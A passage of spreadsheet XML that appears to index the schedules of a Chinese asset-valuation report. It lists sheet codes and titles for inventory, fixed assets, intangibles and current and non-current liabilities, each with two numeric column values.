      <c r="M23" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="24">
      <c r="A24" s="519" t="inlineStr">
        <is>
          <t>3-9存货汇总</t>
        </is>
      </c>
      <c r="C24" s="518" t="inlineStr">
        <is>
          <t>存货评估汇总表</t>
        </is>
      </c>
      <c r="L24" s="518" t="n">
        <v>25</v>
      </c>
      <c r="M24" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="25">
      <c r="A25" s="519" t="inlineStr">
        <is>
          <t>3-9-1材料采购（在途物资）</t>
        </is>
      </c>
      <c r="C25" s="518" t="inlineStr">
        <is>
          <t>存货—材料采购（在途物资）评估明细表</t>
        </is>
      </c>
      <c r="L25" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M25" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="26">
      <c r="A26" s="519" t="inlineStr">
        <is>
          <t>3-9-2原材料</t>
        </is>
      </c>
      <c r="C26" s="518" t="inlineStr">
        <is>
          <t>存货—原材料评估明细表</t>
        </is>
      </c>
      <c r="L26" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M26" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="27">
      <c r="A27" s="519" t="inlineStr">
        <is>
          <t>3-9-3在库周转材料</t>
        </is>
      </c>
      <c r="C27" s="518" t="inlineStr">
        <is>
          <t>存货—在库周转材料评估明细表</t>
        </is>
      </c>
      <c r="L27" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M27" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="28">
      <c r="A28" s="519" t="inlineStr">
        <is>
          <t>3-9-4委托加工物资</t>
        </is>
      </c>
      <c r="C28" s="518" t="inlineStr">
        <is>
          <t>存货—委托加工物资评估明细表</t>
        </is>
      </c>
      <c r="L28" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M28" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="29">
      <c r="A29" s="519" t="inlineStr">
        <is>
          <t>3-9-5产成品（库存商品）</t>
        </is>
      </c>
      <c r="C29" s="518" t="inlineStr">
        <is>
          <t>存货—产成品（库存商品、开发产品、农产品）评估明细表</t>
        </is>
      </c>
      <c r="L29" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M29" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="30">
      <c r="A30" s="519" t="inlineStr">
        <is>
          <t>3-9-6在产品（自制半成品）</t>
        </is>
      </c>
      <c r="C30" s="518" t="inlineStr">
        <is>
          <t>存货—在产品（自制半成品）评估明细表</t>
        </is>
      </c>
      <c r="L30" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M30" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="31">
      <c r="A31" s="519" t="inlineStr">
        <is>
          <t>3-9-7发出商品</t>
        </is>
      </c>
      <c r="C31" s="518" t="inlineStr">
        <is>
          <t>存货—发出商品评估明细表</t>
        </is>
      </c>
      <c r="L31" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M31" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="32">
      <c r="A32" s="520" t="inlineStr">
        <is>
          <t>3-9-8在用周转材料</t>
        </is>
      </c>
      <c r="C32" s="518" t="inlineStr">
        <is>
          <t>存货—在用周转材料评估明细表</t>
        </is>
      </c>
      <c r="L32" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M32" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="33" ht="16" customHeight="1" s="415">
      <c r="A33" s="519" t="inlineStr">
        <is>
          <t>3-9-9合同履约成本</t>
        </is>
      </c>
      <c r="C33" s="165" t="inlineStr">
        <is>
          <t>存货—合同履约成本评估明细表</t>
        </is>
      </c>
      <c r="L33" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M33" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="34">
      <c r="A34" s="520" t="inlineStr">
        <is>
          <t>3-10合同资产</t>
        </is>
      </c>
      <c r="C34" s="518" t="inlineStr">
        <is>
          <t>合同资产评估明细表</t>
        </is>
      </c>
      <c r="L34" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M34" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="35">
      <c r="A35" s="519" t="inlineStr">
        <is>
          <t>3-11持有待售资产</t>
        </is>
      </c>
      <c r="C35" s="518" t="inlineStr">
        <is>
          <t>持有待售资产评估明细表</t>
        </is>
      </c>
      <c r="L35" s="518" t="n">
        <v>33</v>
      </c>
      <c r="M35" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="36">
      <c r="A36" s="519" t="inlineStr">
        <is>
          <t>3-12一年到期非流动资产</t>
        </is>
      </c>
      <c r="C36" s="518" t="inlineStr">
        <is>
          <t>一年内到期的非流动资产评估明细表</t>
        </is>
      </c>
      <c r="L36" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M36" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="37">
      <c r="A37" s="519" t="inlineStr">
        <is>
          <t>3-13其他流动资产</t>
        </is>
      </c>
      <c r="C37" s="518" t="inlineStr">
        <is>
          <t>其他流动资产评估明细表</t>
        </is>
      </c>
      <c r="L37" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M37" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="38">
      <c r="A38" s="519" t="inlineStr">
        <is>
          <t>4-非流动资产汇总</t>
        </is>
      </c>
      <c r="C38" s="165" t="inlineStr">
        <is>
          <t>非流动资产评估汇总表</t>
        </is>
      </c>
      <c r="L38" s="518" t="n">
        <v>27</v>
      </c>
      <c r="M38" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="39">
      <c r="A39" s="519" t="inlineStr">
        <is>
          <t>4-1债权投资</t>
        </is>
      </c>
      <c r="C39" s="518" t="inlineStr">
        <is>
          <t>债权投资评估明细表</t>
        </is>
      </c>
      <c r="L39" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M39" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="40">
      <c r="A40" s="519" t="inlineStr">
        <is>
          <t>4-2其他债权投资</t>
        </is>
      </c>
      <c r="C40" s="518" t="inlineStr">
        <is>
          <t>其他债权投资评估明细表</t>
        </is>
      </c>
      <c r="L40" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M40" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="41">
      <c r="A41" s="519" t="inlineStr">
        <is>
          <t>4-3长期应收</t>
        </is>
      </c>
      <c r="C41" s="518" t="inlineStr">
        <is>
          <t>长期应收款评估明细表</t>
        </is>
      </c>
      <c r="L41" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M41" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="42">
      <c r="A42" s="519" t="inlineStr">
        <is>
          <t>4-4股权投资</t>
        </is>
      </c>
      <c r="C42" s="518" t="inlineStr">
        <is>
          <t>长期股权投资评估明细表</t>
        </is>
      </c>
      <c r="L42" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M42" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="43">
      <c r="A43" s="519" t="inlineStr">
        <is>
          <t>4-5其他权益工具投资</t>
        </is>
      </c>
      <c r="C43" s="518" t="inlineStr">
        <is>
          <t>其他权益工具投资评估明细表</t>
        </is>
      </c>
      <c r="L43" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M43" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="44">
      <c r="A44" s="519" t="inlineStr">
        <is>
          <t>4-6其他非流动金融资产</t>
        </is>
      </c>
      <c r="C44" s="518" t="inlineStr">
        <is>
          <t>其他非流动金融资产评估汇总表</t>
        </is>
      </c>
      <c r="L44" s="518" t="n">
        <v>24</v>
      </c>
      <c r="M44" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="45">
      <c r="A45" s="519" t="inlineStr">
        <is>
          <t>4-6-1-股票</t>
        </is>
      </c>
      <c r="C45" s="518" t="inlineStr">
        <is>
          <t>其他非流动金融资产金融资产—股票投资评估明细表</t>
        </is>
      </c>
      <c r="L45" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M45" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="46">
      <c r="A46" s="519" t="inlineStr">
        <is>
          <t>4-6-2-债券</t>
        </is>
      </c>
      <c r="C46" s="518" t="inlineStr">
        <is>
          <t>其他非流动金融资产—债券投资评估明细表</t>
        </is>
      </c>
      <c r="L46" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M46" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="47">
      <c r="A47" s="519" t="inlineStr">
        <is>
          <t>4-6-3-基金</t>
        </is>
      </c>
      <c r="C47" s="518" t="inlineStr">
        <is>
          <t>其他非流动金融资产—基金投资评估明细表</t>
        </is>
      </c>
      <c r="L47" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M47" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="48">
      <c r="A48" s="519" t="inlineStr">
        <is>
          <t>4-7投资性房地产汇总</t>
        </is>
      </c>
      <c r="C48" s="518" t="inlineStr">
        <is>
          <t>投资性房地产评估汇总表</t>
        </is>
      </c>
      <c r="L48" s="518" t="n">
        <v>21</v>
      </c>
      <c r="M48" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="49">
      <c r="A49" s="519" t="inlineStr">
        <is>
          <t>4-7-1投资性房地产</t>
        </is>
      </c>
      <c r="C49" s="518" t="inlineStr">
        <is>
          <t>投资性房地产——房屋评估明细表</t>
        </is>
      </c>
      <c r="L49" s="518" t="n">
        <v>6</v>
      </c>
      <c r="M49" s="518" t="n">
        <v>15</v>
      </c>
    </row>
    <row r="50">
      <c r="A50" s="519" t="inlineStr">
        <is>
          <t>4-7-2投资性房地产</t>
        </is>
      </c>
      <c r="C50" s="518" t="inlineStr">
        <is>
          <t>投资性房地产——房屋评估明细表</t>
        </is>
      </c>
      <c r="L50" s="518" t="n">
        <v>6</v>
      </c>
      <c r="M50" s="518" t="n">
        <v>15</v>
      </c>
    </row>
    <row r="51">
      <c r="A51" s="519" t="inlineStr">
        <is>
          <t>4-7-3投资性地产</t>
        </is>
      </c>
      <c r="C51" s="518" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权评估明细表</t>
        </is>
      </c>
      <c r="L51" s="518" t="n">
        <v>6</v>
      </c>
      <c r="M51" s="518" t="n">
        <v>17</v>
      </c>
    </row>
    <row r="52">
      <c r="A52" s="519" t="inlineStr">
        <is>
          <t>4-7-4投资性地产</t>
        </is>
      </c>
      <c r="C52" s="518" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权评估明细表</t>
        </is>
      </c>
      <c r="L52" s="518" t="n">
        <v>6</v>
      </c>
      <c r="M52" s="518" t="n">
        <v>17</v>
      </c>
    </row>
    <row r="53">
      <c r="A53" s="519" t="inlineStr">
        <is>
          <t>4-8固定资产汇总</t>
        </is>
      </c>
      <c r="C53" s="518" t="inlineStr">
        <is>
          <t>固定资产评估汇总表</t>
        </is>
      </c>
      <c r="L53" s="518" t="n">
        <v>22</v>
      </c>
      <c r="M53" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="54">
      <c r="A54" s="519" t="inlineStr">
        <is>
          <t>4-8-1房屋建筑物</t>
        </is>
      </c>
      <c r="C54" s="518" t="inlineStr">
        <is>
          <t>固定资产—房屋建筑物评估明细表</t>
        </is>
      </c>
      <c r="L54" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M54" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="55">
      <c r="A55" s="519" t="inlineStr">
        <is>
          <t>4-8-2构筑物</t>
        </is>
      </c>
      <c r="C55" s="518" t="inlineStr">
        <is>
          <t>固定资产—构筑物及其他辅助设施评估明细表</t>
        </is>
      </c>
      <c r="L55" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M55" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="56">
      <c r="A56" s="519" t="inlineStr">
        <is>
          <t>4-8-3管道沟槽</t>
        </is>
      </c>
      <c r="C56" s="518" t="inlineStr">
        <is>
          <t>固定资产—管道和沟槽评估明细表</t>
        </is>
      </c>
      <c r="L56" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M56" s="518" t="n">
        <v>17</v>
      </c>
    </row>
    <row r="57">
      <c r="A57" s="519" t="inlineStr">
        <is>
          <t>4-8-4机器设备</t>
        </is>
      </c>
      <c r="C57" s="518" t="inlineStr">
        <is>
          <t>固定资产—机器设备评估明细表</t>
        </is>
      </c>
      <c r="L57" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M57" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="58">
      <c r="A58" s="519" t="inlineStr">
        <is>
          <t>4-8-5车辆</t>
        </is>
      </c>
      <c r="C58" s="518" t="inlineStr">
        <is>
          <t>固定资产—车辆评估明细表</t>
        </is>
      </c>
      <c r="L58" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M58" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="59">
      <c r="A59" s="519" t="inlineStr">
        <is>
          <t>4-8-6电子设备</t>
        </is>
      </c>
      <c r="C59" s="518" t="inlineStr">
        <is>
          <t>固定资产—电子设备评估明细表</t>
        </is>
      </c>
      <c r="L59" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M59" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="60">
      <c r="A60" s="519" t="inlineStr">
        <is>
          <t>4-8-7固定资产清理</t>
        </is>
      </c>
      <c r="C60" s="518" t="inlineStr">
        <is>
          <t>固定资产清理评估明细表</t>
        </is>
      </c>
      <c r="L60" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M60" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="61">
      <c r="A61" s="519" t="inlineStr">
        <is>
          <t>4-9在建工程汇总</t>
        </is>
      </c>
      <c r="C61" s="518" t="inlineStr">
        <is>
          <t>在建工程评估汇总表</t>
        </is>
      </c>
      <c r="L61" s="518" t="n">
        <v>27</v>
      </c>
      <c r="M61" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="62">
      <c r="A62" s="519" t="inlineStr">
        <is>
          <t>4-9-1在建（土建）</t>
        </is>
      </c>
      <c r="C62" s="518" t="inlineStr">
        <is>
          <t>在建工程—土建工程评估明细表</t>
        </is>
      </c>
      <c r="L62" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M62" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="63">
      <c r="A63" s="519" t="inlineStr">
        <is>
          <t>4-9-2在建（设备）</t>
        </is>
      </c>
      <c r="C63" s="518" t="inlineStr">
        <is>
          <t>在建工程—设备安装工程评估明细表</t>
        </is>
      </c>
      <c r="L63" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M63" s="518" t="n">
        <v>18</v>
      </c>
    </row>
    <row r="64">
      <c r="A64" s="519" t="inlineStr">
        <is>
          <t>4-9-3在建工程（工程物资）</t>
        </is>
      </c>
      <c r="C64" s="518" t="inlineStr">
        <is>
          <t>在建工程—工程物资评估明细表</t>
        </is>
      </c>
      <c r="L64" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M64" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="65">
      <c r="A65" s="519" t="inlineStr">
        <is>
          <t>4-10生产性生物资产</t>
        </is>
      </c>
      <c r="C65" s="518" t="inlineStr">
        <is>
          <t>生产性生物资产评估明细表</t>
        </is>
      </c>
      <c r="L65" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M65" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="66">
      <c r="A66" s="519" t="inlineStr">
        <is>
          <t>4-11油气资产</t>
        </is>
      </c>
      <c r="C66" s="518" t="inlineStr">
        <is>
          <t>油气资产评估明细表</t>
        </is>
      </c>
      <c r="L66" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M66" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="67">
      <c r="A67" s="519" t="inlineStr">
        <is>
          <t>4-12使用权资产</t>
        </is>
      </c>
      <c r="C67" s="518" t="inlineStr">
        <is>
          <t>使用权资产评估明细表</t>
        </is>
      </c>
      <c r="L67" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M67" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="68">
      <c r="A68" s="519" t="inlineStr">
        <is>
          <t>4-13无形资产汇总</t>
        </is>
      </c>
      <c r="C68" s="518" t="inlineStr">
        <is>
          <t>无形资产评估汇总表</t>
        </is>
      </c>
      <c r="L68" s="518" t="n">
        <v>8</v>
      </c>
      <c r="M68" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="69">
      <c r="A69" s="520" t="inlineStr">
        <is>
          <t>4-13-1无形-土地</t>
        </is>
      </c>
      <c r="C69" s="518" t="inlineStr">
        <is>
          <t>无形资产—土地使用权评估明细表</t>
        </is>
      </c>
      <c r="L69" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M69" s="518" t="n">
        <v>16</v>
      </c>
    </row>
    <row r="70">
      <c r="A70" s="519" t="inlineStr">
        <is>
          <t>4-13-2无形-矿业权</t>
        </is>
      </c>
      <c r="C70" s="518" t="inlineStr">
        <is>
          <t>无形资产—矿业权评估明细表</t>
        </is>
      </c>
      <c r="L70" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M70" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="71">
      <c r="A71" s="519" t="inlineStr">
        <is>
          <t>4-13-3无形-其他</t>
        </is>
      </c>
      <c r="C71" s="518" t="inlineStr">
        <is>
          <t>无形资产—其他无形资产评估明细表</t>
        </is>
      </c>
      <c r="L71" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M71" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="72">
      <c r="A72" s="519" t="inlineStr">
        <is>
          <t>4-14开发支出</t>
        </is>
      </c>
      <c r="C72" s="518" t="inlineStr">
        <is>
          <t>开发支出评估明细表</t>
        </is>
      </c>
      <c r="L72" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M72" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="73">
      <c r="A73" s="519" t="inlineStr">
        <is>
          <t>4-15商誉</t>
        </is>
      </c>
      <c r="C73" s="518" t="inlineStr">
        <is>
          <t>商誉评估明细表</t>
        </is>
      </c>
      <c r="L73" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M73" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="74">
      <c r="A74" s="519" t="inlineStr">
        <is>
          <t>4-16长期待摊费用</t>
        </is>
      </c>
      <c r="C74" s="518" t="inlineStr">
        <is>
          <t>长期待摊费用评估明细表</t>
        </is>
      </c>
      <c r="L74" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M74" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="75">
      <c r="A75" s="519" t="inlineStr">
        <is>
          <t>4-17递延所得税资产</t>
        </is>
      </c>
      <c r="C75" s="518" t="inlineStr">
        <is>
          <t>递延所得税资产评估明细表</t>
        </is>
      </c>
      <c r="L75" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M75" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="76">
      <c r="A76" s="519" t="inlineStr">
        <is>
          <t>4-18其他非流动资产</t>
        </is>
      </c>
      <c r="C76" s="518" t="inlineStr">
        <is>
          <t>其他非流动资产评估明细表</t>
        </is>
      </c>
      <c r="L76" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M76" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="77">
      <c r="A77" s="519" t="inlineStr">
        <is>
          <t>5-流动负债汇总</t>
        </is>
      </c>
      <c r="C77" s="518" t="inlineStr">
        <is>
          <t>流动负债评估汇总表</t>
        </is>
      </c>
      <c r="L77" s="518" t="n">
        <v>27</v>
      </c>
      <c r="M77" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="78">
      <c r="A78" s="519" t="inlineStr">
        <is>
          <t>5-1短期借款</t>
        </is>
      </c>
      <c r="C78" s="518" t="inlineStr">
        <is>
          <t>短期借款评估明细表</t>
        </is>
      </c>
      <c r="L78" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M78" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="79">
      <c r="A79" s="519" t="inlineStr">
        <is>
          <t>5-2交易性金融负债</t>
        </is>
      </c>
      <c r="C79" s="518" t="inlineStr">
        <is>
          <t>交易性金融负债评估明细表</t>
        </is>
      </c>
      <c r="L79" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M79" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="80">
      <c r="A80" s="519" t="inlineStr">
        <is>
          <t>5-3衍生金融负债</t>
        </is>
      </c>
      <c r="C80" s="518" t="inlineStr">
        <is>
          <t>衍生金融负债评估明细表</t>
        </is>
      </c>
      <c r="L80" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M80" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="81">
      <c r="A81" s="519" t="inlineStr">
        <is>
          <t>5-4应付票据</t>
        </is>
      </c>
      <c r="C81" s="518" t="inlineStr">
        <is>
          <t>应付票据评估明细表</t>
        </is>
      </c>
      <c r="L81" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M81" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="82">
      <c r="A82" s="519" t="inlineStr">
        <is>
          <t>5-5应付账款</t>
        </is>
      </c>
      <c r="C82" s="518" t="inlineStr">
        <is>
          <t>应付账款评估明细表</t>
        </is>
      </c>
      <c r="L82" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M82" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="83">
      <c r="A83" s="519" t="inlineStr">
        <is>
          <t>5-6预收款项</t>
        </is>
      </c>
      <c r="C83" s="518" t="inlineStr">
        <is>
          <t>预收款项评估明细表</t>
        </is>
      </c>
      <c r="L83" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M83" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="84">
      <c r="A84" s="519" t="inlineStr">
        <is>
          <t>5-7合同负债</t>
        </is>
      </c>
      <c r="C84" s="518" t="inlineStr">
        <is>
          <t>合同负债评估明细表</t>
        </is>
      </c>
      <c r="L84" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M84" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="85">
      <c r="A85" s="519" t="inlineStr">
        <is>
          <t>5-8职工薪酬</t>
        </is>
      </c>
      <c r="C85" s="518" t="inlineStr">
        <is>
          <t>应付职工薪酬评估明细表</t>
        </is>
      </c>
      <c r="L85" s="518" t="n">
        <v>20</v>
      </c>
      <c r="M85" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="86">
      <c r="A86" s="519" t="inlineStr">
        <is>
          <t>5-9应交税费</t>
        </is>
      </c>
      <c r="C86" s="518" t="inlineStr">
        <is>
          <t>应交税费评估明细表</t>
        </is>
      </c>
      <c r="L86" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M86" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="87">
      <c r="A87" s="519" t="inlineStr">
        <is>
          <t>5-10其他应付款汇总表</t>
        </is>
      </c>
      <c r="C87" s="518" t="inlineStr">
        <is>
          <t>其他应付款评估汇总表</t>
        </is>
      </c>
      <c r="L87" s="518" t="n">
        <v>8</v>
      </c>
      <c r="M87" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="88">
      <c r="A88" s="519" t="inlineStr">
        <is>
          <t>5-10-1应付利息</t>
        </is>
      </c>
      <c r="C88" s="518" t="inlineStr">
        <is>
          <t>其他应付款—应付利息评估明细表</t>
        </is>
      </c>
      <c r="L88" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M88" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="89">
      <c r="A89" s="519" t="inlineStr">
        <is>
          <t>5-10-2应付股利（利润）</t>
        </is>
      </c>
      <c r="C89" s="518" t="inlineStr">
        <is>
          <t>其他应付款—应付股利（应付利润）评估明细表</t>
        </is>
      </c>
      <c r="L89" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M89" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="90">
      <c r="A90" s="519" t="inlineStr">
        <is>
          <t>5-10-3其他应付款</t>
        </is>
      </c>
      <c r="C90" s="518" t="inlineStr">
        <is>
          <t>其他应付款—其他应付款评估明细表</t>
        </is>
      </c>
      <c r="L90" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M90" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="91">
      <c r="A91" s="519" t="inlineStr">
        <is>
          <t>5-11持有待售负债</t>
        </is>
      </c>
      <c r="C91" s="518" t="inlineStr">
        <is>
          <t>持有待售负债评估明细表</t>
        </is>
      </c>
      <c r="L91" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M91" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="92">
      <c r="A92" s="519" t="inlineStr">
        <is>
          <t>5-12一年到期非流动负债</t>
        </is>
      </c>
      <c r="C92" s="518" t="inlineStr">
        <is>
          <t>一年内到期的非流动负债评估明细表</t>
        </is>
      </c>
      <c r="L92" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M92" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="93">
      <c r="A93" s="519" t="inlineStr">
        <is>
          <t>5-13其他流动负债</t>
        </is>
      </c>
      <c r="C93" s="518" t="inlineStr">
        <is>
          <t>其他流动负债评估明细表</t>
        </is>
      </c>
      <c r="L93" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M93" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="94">
      <c r="A94" s="519" t="inlineStr">
        <is>
          <t>6-非流动负债汇总</t>
        </is>
      </c>
      <c r="C94" s="518" t="inlineStr">
        <is>
          <t>非流动负债评估汇总表</t>
        </is>
      </c>
      <c r="L94" s="518" t="n">
        <v>27</v>
      </c>
      <c r="M94" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="95">
      <c r="A95" s="519" t="inlineStr">
        <is>
          <t>6-1长期借款</t>
        </is>
      </c>
      <c r="C95" s="518" t="inlineStr">
        <is>
          <t>长期借款评估明细表</t>
        </is>
      </c>
      <c r="L95" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M95" s="518" t="n">
        <v>14</v>
      </c>
    </row>
    <row r="96">
      <c r="A96" s="519" t="inlineStr">
        <is>
          <t>6-2应付债券</t>
        </is>
      </c>
      <c r="C96" s="518" t="inlineStr">
        <is>
          <t>应付债券评估明细表</t>
        </is>
      </c>
      <c r="L96" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M96" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="97">
      <c r="A97" s="519" t="inlineStr">
        <is>
          <t>6-3租赁负债</t>
        </is>
      </c>
      <c r="C97" s="518" t="inlineStr">
        <is>
          <t>租赁负债评估明细表</t>
        </is>
      </c>
      <c r="L97" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M97" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="98">
      <c r="A98" s="519" t="inlineStr">
        <is>
          <t>6-4长期应付款</t>
        </is>
      </c>
      <c r="C98" s="518" t="inlineStr">
        <is>
          <t>长期应付款评估明细表</t>
        </is>
      </c>
      <c r="L98" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M98" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="99">
      <c r="A99" s="519" t="inlineStr">
        <is>
          <t>6-5长期应付职工薪酬</t>
        </is>
      </c>
      <c r="C99" s="518" t="inlineStr">
        <is>
          <t>长期应付职工薪酬评估明细表</t>
        </is>
      </c>
      <c r="L99" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M99" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="100">
      <c r="A100" s="519" t="inlineStr">
        <is>
          <t>6-6预计负债</t>
        </is>
      </c>
      <c r="C100" s="518" t="inlineStr">
        <is>
          <t>预计负债评估明细表</t>
        </is>
      </c>
      <c r="L100" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M100" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="101">
      <c r="A101" s="519" t="inlineStr">
        <is>
          <t>6-7递延收益</t>
        </is>
      </c>
      <c r="C101" s="518" t="inlineStr">
        <is>
          <t>递延收益评估明细表</t>
        </is>
      </c>
      <c r="L101" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M101" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="102">
      <c r="A102" s="519" t="inlineStr">
        <is>
          <t>6-8递延所得税负债</t>
        </is>
      </c>
      <c r="C102" s="518" t="inlineStr">
        <is>
          <t>递延所得税负债评估明细表</t>
        </is>
      </c>
      <c r="L102" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M102" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="103">
      <c r="A103" s="520" t="inlineStr">
        <is>
          <t>6-9其他非流动负债</t>
        </is>
      </c>
      <c r="C103" s="518" t="inlineStr">
        <is>
          <t>其他非流动负债评估明细表</t>
        </is>
      </c>
      <c r="L103" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M103" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="104">
      <c r="A104" s="519" t="inlineStr">
        <is>
          <t>8-减值准备汇总表</t>
        </is>
      </c>
      <c r="C104" s="518" t="inlineStr">
        <is>
          <t>资产减值准备备查付表</t>
